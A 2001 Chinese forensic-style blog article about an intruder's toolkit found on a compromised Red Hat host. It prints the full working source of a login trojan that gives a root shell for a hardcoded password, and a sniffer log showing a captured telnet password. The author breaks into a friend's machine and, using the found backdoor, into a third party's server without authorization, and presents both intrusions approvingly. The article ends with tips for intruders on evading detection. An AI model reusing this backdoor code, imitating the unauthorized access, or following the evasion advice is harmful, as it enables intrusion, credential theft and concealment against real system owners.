---
title: "分析某台机器上发现的工具包"
date: 2001-03-02T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-91"
---

(quack_at_xfocus.org)

分析某台机器上发现的工具包


by quack(quack@antionline.org)


前些日子测试那个bind的漏洞，顺便就帮一哥们检测了一下他的主机――红帽子

6.0的机器，一不小心居然又进去了――!@#$%^%，真是搞不懂为什么现在漏洞资

料已是满天飞的情况下，网上怎么还有这么多“公鸡”。


依照习惯，先w看看有谁在:


# w


嘿，好象就我一个人呀，看看有什么进程在跑吧……


# ps -aux


cracker$ ps -aux

USER     PID %CPU %MEM   VSZ  RSS  TT  STAT STARTED      TIME COMMAND

ronin    418  0.0  0.9   420  240  p0  R+    7:15PM   0:00.01 ps -aux

root       1  0.0  0.9   520  264  ??  Is    5:00PM   0:00.03 /sbin/init --

root       2  0.0  0.0     0    0  ??  DL    5:00PM   0:00.01  (pagedaemon)

root       3  0.0  0.0     0    0  ??  DL    5:00PM   0:00.00  (vmdaemon)

root       4  0.0  0.0     0    0  ??  DL    5:00PM   0:01.37  (syncer)

root     128  0.0  2.1   876  588  ??  Is    5:00PM   0:00.54 syslogd

daemon   137  0.0  1.9   884  536  ??  Is    5:00PM   0:00.01 /usr/sbin/portmap

root     148  0.0  1.1   476  304  ??  Is    5:00PM   0:00.01 mountd -r

root     151  0.0  0.7   336  196  ??  Is    5:00PM   0:00.01 nfsd: master (nfs

root     155  0.0  0.6   316  160  ??  I     5:00PM   0:00.00 nfsd: server (nfs

root     156  0.0  0.6   316  160  ??  I     5:00PM   0:00.00 nfsd: server (nfs

root     157  0.0  0.6   316  160  ??  I     5:00PM   0:00.00 nfsd: server (nfs

root     158  0.0  0.6   316  160  ??  I     5:00PM   0:00.00 nfsd: server (nfs

root     159  0.0  1.9 263024  552  ??  Is    5:00PM   0:00.00 rpc.statd

root     168  0.0  0.3   216   80  ??  I     5:00PM   0:00.00 nfsiod -n 4

root     169  0.0  0.3   216   80  ??  I     5:00PM   0:00.00 nfsiod -n 4

root     170  0.0  0.3   216   80  ??  I     5:00PM   0:00.00 nfsiod -n 4

root     171  0.0  0.3   216   80  ??  I     5:00PM   0:00.00 nfsiod -n 4

root     192  0.0  3.2  1296  920  ??  Is    5:00PM   0:01.56 sshd (sshd1)

root     195  0.0  2.1   952  616  ??  Is    5:00PM   0:00.03 inetd -wW

root     198  0.0  2.1  1040  588  ??  Is    5:00PM   0:00.11 cron

root     202  0.0  3.5  1388 1004  ??  Is    5:00PM   0:00.09 sendmail: accepti

root     228  0.0  1.7   844  480  ??  Is    5:00PM   0:00.01 moused -p /dev/cu

root     257  0.0  2.1   888  600  v0  Is+   5:00PM   0:00.02 /usr/libexec/gett

root     258  0.0  2.1   888  600  v1  Is+   5:00PM   0:00.02 /usr/libexec/gett

root     259  0.0  2.1   888  600  v2  Is+   5:00PM   0:00.02 /usr/libexec/gett

root     260  0.0  2.1   888  600  v3  Is+   5:00PM   0:00.01 /usr/libexec/gett

root     261  0.0  2.1   888  600  v4  Is+   5:00PM   0:00.02 /usr/libexec/gett

root     262  0.0  2.1   888  600  v5  Is+   5:00PM   0:00.02 /usr/libexec/gett

root     263  0.0  2.1   888  600  v6  Is+   5:00PM   0:00.01 /usr/libexec/gett

root     264  0.0  2.1   888  600  v7  Is+   5:00PM   0:00.02 /usr/libexec/gett

root     277  0.0  3.6  1512 1028  p0- I     5:16PM   0:00.44 su (bash)

root     411  0.0  2.9  1184  828  ??  Ss    7:14PM   0:00.06 telnetd

ronin    412  0.0  3.5  1500 1020  p0  Ss    7:14PM   0:00.12 -bash (bash)

root       0  0.0  0.0     0    0  ??  DLs   5:00PM   0:00.01  (swapper)


唔，很正常……


# netstat -a |more


........

........

........


也很正常……


xixi，我还是先把login替换掉，明天再警告我那哥们吧:)


# ls -la /usr/sbin|grep login

login

.login


咦，有鬼，真够巧的，居然有个.login，莫非有人已经捷足先登了？两个login

还不一样大哦……，telnet到自己的红帽子上:


# telnet quack


查看一下login的实际大小，真是被人换掉了！那――看看ps和netstat吧，估计也好

不了多少，哼，刚才看到的ps和netstat的输出说不定都是被伪装过的了！


把我本机的ps跟netstat和朋友这台机器的ps和netstat拿来diff一下，果然不同！


看来是有鬼了，帮它备一份吧


mv ps ps_fake

mv netstat netstat_fake


再把自己机器上绝对没被改过的ps与netstat传上去……


# rcp root@*.*.*.*:/bin/ps /bin/ps

# rcp root@*.*.*.*:/usr/bin/netstat /usr/bin/netstat


我再来看看……


# ps -ef|more


发达喽，这么多东东……


啊――知道我发现什么了么？居然有个nmap的进程nohup着……由root启动的"有趣"程序有：


sniffit -a -p 23 -t *.*.*.*

nmap -P0 -sF -O 111.111.*.* -oN /etc/X11/.X11default/.../111.111.log

bindshell


这个入侵者的工具包看来是放在/etc/X11/.X11default/.../呀，我们来看看里面

都有哪些东西吧……


哇，看来这台机器当公鸡也好长时间了哦――积累了这么多好东西了呀，都成大本

营了……


哦，对了，等等，先看看这个入侵者在不在机器上再说……


# netstat -a|more  <-----------这回是自己的netstat了:)输出的结果除了我自

己就没看到别人了……


唔，象是不在哦，只是还有一些进程挂着――好象是死进程了，没杀掉而已，便宜了

我了:)，这个210.*.*.*，好象是台湾的吧，最近怎么老和台湾打交道?算了，先看

看他的习惯吧，装什么后门……顺便开个进程扫一下这台机器……


觉得好笑的是，这个兄弟也太老实了些，居然把源码什么的一古脑留下来供人分析，

而且编译时老老实实的以源码的名字来命名……xixi,我看看他login是用什么替的，

哦，这个东东呀……


/* Universal trojan ( login / imapd / qpopd )

But will work on more daemons and on most systems.

After installed on the system.

Telnet to the daemon and you will have 1 second to type in

the trojan passwd to get root access else it executes the real daemon.  */


/*

*   PUBLIC! PUBLIC! PUBLIC! PUBLIC! PUBLIC! PUBLIC! PUBLIC! PUBLIC! :P

*

*             mitra (  login / ipop3d / imapd trojan )

*               axess ( axess@mail.com ) in Dec-1999

*

*   This is an combined login / ipop3d / imapd trojan.

*   This should work with other deamons but i have only tested these 3.

*

*   REAL == mv the real deamon to this path.

*   TROJAN == This is the real path of the deamon, put the trojan here.

*

*   It defaults to login trojan now.

*   Dont forgot you might have to the rights of the trojan.

*   Telnet to the port whatever deamon its set for.

*   The passwd you need to enter in one second == door

*   and you will get that lovely # =)

*   This works on most systems.

*

*/


#include<signal.h>

#include<stdio.h>

#include<string.h>

#include<unistd.h>


#define REAL "/bin/.login"

#define TROJAN "/bin/login"

#define ROOT "xundi"

/*            ^^^^^

                | 

                +--------->xixi，密码怎么是xundi？呵呵开玩笑啦

                           这边密码看看，后面要用到的。      */

char **execute;

char passwd[5];


int main(int argc, char *argv[]) {

void connection();


signal(SIGALRM,connection);

alarm(1);

execute=argv;

*execute=TROJAN;


scanf("%s",passwd);


if(strcmp(passwd,ROOT)==0) {

alarm(0);

execl("/bin/sh","/bin/sh","-i",0);

exit(0);

}

else

{

execv(REAL,execute);

exit(0);

}

}


void connection()

{

execv(REAL,execute);

exit(0);

}


那边台湾那台机器的结果也已经出来了，是solaris7的机器，但没有致

命的漏洞:(，如果这台也是入侵者的肉鸡的话，估计他关掉了一些服务，

以免被人轻易攻陷……，那么，我们来试试他自己的后门……


# telnet 210.*.*.* 在一秒钟内输入password……,于是看到


#


呵呵，真是爽到极点，进来了又:)……可以做的事有好多啦，但……


先不管别人的事了，我打了个电话给那哥们，嘿，这小子有用Tripwire对

系统里的文件目录做了数据库记录了，嘿，那就好办，运行一下吧，结果

发现，系统里面有了好些变化哦:


一、那位入侵者已经在机器里装了：


1.sniffit0.3.7              <---------- 监听工具

2.nmap2.52以及nmap-web1.4   <---------- 扫描工具，以及它的cgi版本

3.pscan                     <---------- 扫描端口的工具，速度颇快，但会有许多log

4.lrk                       <---------- liunx root kit

5.ulogin.c                  <---------- 一个假的login，你要DISPLAY="password";export DISPLAY然后telnet                                        

6.nc                        <---------- telnet工具，也可以绑定端口

7.trojan.c                  <---------- 假的login，需要在login出来前一秒输入password就行了

8.wu-ftpd.trojan.tar        <---------- 假的wu-ftpd守护进程，telnet到21口并输入特定用户名就是root

9.bindshell.c               <---------- 端口绑定工具

10.wipe                     <---------- 擦log的一个工具


二、并且更改了以留下后门:


1./etc/inetd.conf           <----------- 把端口9改成了sh

2./etc/rc.d/rc.local        <----------- 将上面所说的bindshell添了进去


三、进行了一些扫描及监听的活，留下一些记录文件：


1.210.*.cmsd.log           <------------ 某个B类网址的cmsd漏洞扫描结果

2.210.*.sadmind.log        <------------ 某个B类网址的sadmind漏洞扫描结果

3.sni.log                   <------------ 对这台机的监听结果!@$%^&&$#@


四、安装了DDOS工具


1.tfn2k                     <------------ 无须多说了吧:)大名鼎鼎呀……


五、某些攻击性的exploit，如：


1.t666.c                    <------------ bind的攻击程序

2.msadc2.pl                 <------------ 针对msadc的攻击程序

3.sadmindex                 <------------ sadmindex的攻击程序及brute程序


六、有一个已经编译好的Solaris下的包，里面有如下工具：


1.pscan                     <------------- 扫描工具

2.tfn2k                     <------------- DDOS工具

3.nc                        <------------- 端口重定向

4.ulogin                    <------------- 后门

5.trojan                    <------------- 后门

6.command.tar               <------------- ps\netstat\ls\find的伪造程序

7.bindshell                 <------------- 端口绑定工具

8.rpc-kit.tar               <------------- rpc的攻击工具包


七、留了两个suid的shell


我来看看sniffit记下什么了吧……xixi,看得是不是很头大，我也烦……


Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1335-192.168.0.2.23

 E . . ( ? . @ . . . : i . . . . . . . . . 7 . . . . D 3 . . . . P . . . . .

 . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1335-192.168.0.2.23

 E . . ( @ . @ . . . 9 i . . . . . . . . . 7 . . . . D 3 . . . . P . . . . .

 . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1335-192.168.0.2.23

 E . . ( A . @ . . . 8 i . . . . . . . . . 7 . . . . D 3 . . . . P . . c . .

 . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . , B . @ . . . 7 e . . . . . . . . . 8 . . . . C . . . . . ` .   . . .

 . . . . . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ( C . @ . . . 6 i . . . . . . . . . 8 . . . . C . . . . { P . " 8 % .

 . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . + D . @ . . . 5 f . . . . . . . . . 8 . . . . C . . . . ~ P . " 5 . .

 . . . . %

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . + E . @ . . . 4 f . . . . . . . . . 8 . . . . C . . . . . P . " # . .

 . . . . &

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . 7 F . @ . . . 3 Z . . . . . . . . . 8 . . . . C . . . . . P . " # . .

 . . . . . . .   . . # . . ' . . $

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . 2 G . @ . . . 2 _ . . . . . . . . . 8 . . . . C . . . . . P . " . y 5

 . . . . . . A N S I . .

             ^^^^^^^

                |

                +------------------------->知道这是什么么？


Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . + H . @ . . . 1 f . . . . . . . . . 8 . . . . C . . . . . P . " . " .

 . . . . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . 7 I . @ . . . 0 Z . . . . . . . . . 8 . . . . C . . . . . P . " . . .

 . . . . . . . " . . . . . . . . !

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . + J . @ . . . / f . . . . . . . . . 8 . . . . C . . . . . P . " . $ .

 . . . . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . + K . @ . . . . f . . . . . . . . . 8 . . . . C . . . . . P . ! . $ .

 . . . . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ( L . @ . . . - i . . . . . . . . . 8 . . . . C . . . . . P . ! . % .

 . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) M . @ . . . , h . . . . . . . . . 8 . . . . C . . . . . P . ! . . .

 . . r

    ^^^

     |

     +-------------------->开始了哦

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) N . @ . . . + h . . . . . . . . . 8 . . . . C . . . . . P . ! . . .

 . . o

    ^^^

     |

     +-------------------->又一个

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ( O . @ . . . * i . . . . . . . . . 8 . . . . C . . . . . P . ! . % .

 . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) P . @ . . . ) h . . . . . . . . . 8 . . . . C . . . . . P . ! . . .

 . . n

    ^^^

     |

     +-------------------->还有

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) Q . @ . . . ( h . . . . . . . . . 8 . . . . C . . . . . P . ! . . .

 . . i

    ^^^

     |

     +-------------------->……

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) R . @ . . . ' h . . . . . . . . . 8 . . . . C . . . . . P . ! . . .

 . . n

    ^^^

     |

     +-------------------->这些就是用户名了啦……

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ( S . @ . . . & i . . . . . . . . . 8 . . . . C . . . . . P . ! . % .

 . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . * T . @ . . . % g . . . . . . . . . 8 . . . . C . . . . . P . ! . . .

 . . . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ( U . @ . . . $ i . . . . . . . . . 8 . . . . C . . . . . P . ! . % .

 . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) V . @ . . . # h . . . . . . . . . 8 . . . . C . . . . . P . ! . . .

 . . h

    ^^^

     |

     +-------------------->密码开始了，睁大眼……

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) W . @ . . . " h . . . . . . . . . 8 . . . . D . . . . . P . ! . . .

 . . a

    ^^^

     |

     +-------------------->……

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) X . @ . . . ! h . . . . . . . . . 8 . . . . D . . . . . P . ! . . .

 . . c

    ^^^

     |

     +-------------------->……

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) Y . @ . . .   h . . . . . . . . . 8 . . . . D . . . . . P . ! . . .

 . . k

    ^^^

     |

     +-------------------->……

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) Z . @ . . . . h . . . . . . . . . 8 . . . . D . . . . . P . ! . . .

 . . e

    ^^^

     |

     +-------------------->……

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1335-192.168.0.2.23

 E . . ( [ . @ . . . . i . . . . . . . . . 7 . . . . D 3 . . . 1 P . . . . .

 . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1335-192.168.0.2.23

 E . . ( \ . @ . . . . i . . . . . . . . . 7 . . . . D 3 . . . . P . " 8 . k

 . .

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1335-192.168.0.2.23

 E . . ( ] . @ . . . . i . . . . . . . . . 7 . . . . D 3 . . . . P . . . . k

 . .

 

Packet ID (from_IP.port-to_IP.port): 192.168.0.1.1336-192.168.0.2.23

 E . . ) ^ . @ . . . . h . . . . . . . . . 8 . . . . D . . . . . P . ! . . .

 . . r

    ^^^

     |

     +-------------------->密码到此结束……


也就是说，密码都被听走了……真是!@#$%^&


往下的事就好办多了，自己补补漏洞，把密码换掉，通知用户更改密码……


总结入侵者所犯的错误：


1、没有帮这台主机打上patch:)，如果想自己长期使用这台机器的话，打上补丁以防

   止别人以同样的方式进入是必要的，也可以避免被人追踪到……

2、上传的后门，漏洞利用程序编译成二进制代码后最后马上删掉源程序，并且编译好

   的程序不要太"老实"，可以随便用些乱七八糟的名字让人摸不着脑袋长哪儿嘛……

3、不同的肉鸡上的后门最好不要设一样，也就是说，如果你用跳板跳到某台机器，那

   么跳板上的后门及你的目标机器上的最好不要一样，要不然容易被人“反咬一口”

4、后门也留得太多了:)，不知是在测试还是怎么着？被抓到一个后很容易让root产生

   "联想"――马上寻找入侵者。

5、某些工具包没有充分利用上，比如lrk，用得好的话人家一下还不容易查觉有人进入

   过系统。


===========================

[http://www.netguard.com.cn](http://www.netguard.com.cn/)

[http://focus.silversand.net](http://focus.silversand.net/)
